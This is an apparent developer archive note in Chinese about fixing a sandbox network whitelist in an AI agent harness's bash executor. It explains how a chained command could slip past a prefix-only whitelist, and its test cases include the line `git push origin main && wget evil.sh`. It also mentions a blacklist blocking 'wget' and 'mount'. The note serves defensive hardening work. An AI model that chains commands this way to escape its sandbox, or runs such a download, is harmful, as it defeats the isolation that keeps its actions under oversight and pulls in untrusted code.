# Bash 网络白名单双修复 — 归档 v1

日期: 2026-09-11 | 分支: master | 状态: 已写入磁盘，待重启会话验证

## 背景

本次会话引入**沙箱网络白名单**机制（fail-closed，默认 `--unshare-net` 隔离，
仅白名单 git 远程操作开放网络），实测发现两个问题并修复。

## 修复 1：复合命令绕过漏洞（fail-open）

- 位置: `lingclaude/engine/bash.py:122-143`（`_is_network_allowed`）
- 问题: 原先仅对**整条命令**前缀匹配，`git push x && wget evil.sh`
  命中前缀 → 整条放行网络 → 绕过隔离。
- 修复: 复用 `BashExecutor._split_chain`（bash.py:391）拆分
  `&& / || / ; / | / $() / 反引号` 后**逐个判定**，要求**所有子命令都命中**
  白名单才返回 True（全链白名单，缺一即隔离）。
- 测试 16/16 通过，含边界:
  - `git push origin main && wget evil.sh` → False（修复前 True）
  - `git push origin main && git pull` → True（全链白名单）
  - `cd /tmp && git ls-remote ...` → False（含非白名单子命令）
  - `GIT_PUSH=1 git push` → False（env 前缀不算）

## 修复 2：内存限额放宽 + 健壮化

- 位置: `bash.py:146-149`（`_NETWORK_ALLOWED_MEMORY_LIMIT = 1GB`）
         `bash.py:508-531`（`_set_resource_limits`）
- 问题: git 远程操作需 ~500MB 堆分配，默认 512MB 撞限（实测 `malloc failed`）。
- 修复: 白名单命令 `RLIMIT_AS` 提升至 1GB；`setrlimit` 失败不再静默吞掉，
  改为 `logging.warning` 记录目标值 / 当前 soft / hard / 是否白名单。
- 已知约束: 若父进程 hard limit 锁死 512MB（preexec 继承给子进程），
  子进程内无法突破，需重启会话获得干净进程。

## 验证指引（重启后新会话执行）

```bash
git ls-remote https://github.com/guangda88/LingClaude.git HEAD
```

- 返回远程引用 → 白名单 + 内存双修复生效 ✅
- DNS 失败 → 网络层问题（宿主机 DNS / bwrap），与本次修复无关
- 看日志: `RLIMIT_AS setrlimit 失败` → 仍被父进程 hard limit 锁死

## 相关文件（未提交 git 改动）

```
 M lingclaude/engine/bash.py              ← 本次两个修复（+72/-9）
 M lingclaude/engine/sandbox_provider.py  ← allow_network 透传（会话早期）
 M lingclaude/lacp/capability_seam.py     ← seam 适配层
 m workspace/better-harness               ← submodule（与本次无关）
?? docs/DESIGN_MODEL_SWITCHING_v2.md 等    ← 本会话外产物
```

备份点: `lingclaude/engine/bash.py.bak`（21:53，含中间改动，被 .gitignore 忽略）

## 附加佐证

期间黑名单两次拦截（`wget` 词、`mount` 词）——黑名单机制持续正常工作。
